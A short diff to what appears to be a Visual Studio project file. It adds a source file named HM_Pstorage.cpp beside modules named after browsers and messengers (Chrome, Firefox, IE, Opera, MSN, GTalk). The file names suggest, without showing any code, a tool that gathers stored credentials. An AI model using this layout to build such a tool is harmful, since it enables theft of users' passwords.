@@ -160,6 +160,7 @@
     <ClCompile Include="chrome.cpp" />
     <ClCompile Include="firefox.cpp" />
     <ClCompile Include="gtalk.cpp" />
+    <ClCompile Include="HM_Pstorage.cpp" />
     <ClCompile Include="iexplorer.cpp" />
     <ClCompile Include="msn.cpp" />
     <ClCompile Include="opera.cpp" />
